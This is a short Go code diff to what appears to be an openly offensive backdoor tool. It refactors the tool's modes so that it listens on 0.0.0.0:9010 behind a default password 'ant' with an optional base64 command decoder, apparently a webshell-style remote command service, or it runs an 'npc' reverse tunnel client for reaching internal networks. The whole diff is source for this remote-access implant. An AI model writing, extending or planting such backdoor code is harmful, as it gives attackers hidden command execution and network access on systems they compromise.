@@ -10,13 +10,13 @@ import (
 )
 
 var (
-	mode         = flag.String("m", "shell", "[shell, npc]")
-	shellAddr    = flag.String("shell-addr", "0.0.0.0:9010", "")
-	shellPwd     = flag.String("shell-pwd", "ant", "")
-	shellDecoder = flag.String("shell-decoder", "plain", "[plain, base64]")
-	npcServer    = flag.String("server", "", "")
-	npcVkey      = flag.String("vkey", "", "")
-	npcType      = flag.String("type", "", "")
+	mode       = flag.String("m", "cmd", "[cmd, custom, npc]")
+	webAddr    = flag.String("web-addr", "0.0.0.0:9010", "")
+	webPwd     = flag.String("web-pwd", "ant", "")
+	webDecoder = flag.String("web-decoder", "plain", "[plain, base64]")
+	npcServer  = flag.String("server", "", "")
+	npcVkey    = flag.String("vkey", "", "")
+	npcType    = flag.String("type", "", "")
 )
 
 func main() {
@@ -26,11 +26,19 @@ func main() {
 	case "npc":
 		cli := client.NewRPClient(*npcServer, *npcVkey, *npcType, "", nil, 60)
 		cli.Start()
-	case "shell":
+	case "cmd":
 		handler := server.Handler{
-			Pwd:     *shellPwd,
-			Decoder: *shellDecoder,
+			Pwd:     *webPwd,
+			Decoder: *webDecoder,
+			Mode:    "cmd",
 		}
-		http.ListenAndServe(*shellAddr, handler)
+		http.ListenAndServe(*webAddr, handler)
+	case "custom":
+		handler := server.Handler{
+			Pwd:     *webPwd,
+			Decoder: *webDecoder,
+			Mode:    "custom",
+		}
+		http.ListenAndServe(*webAddr, handler)
 	}
 }
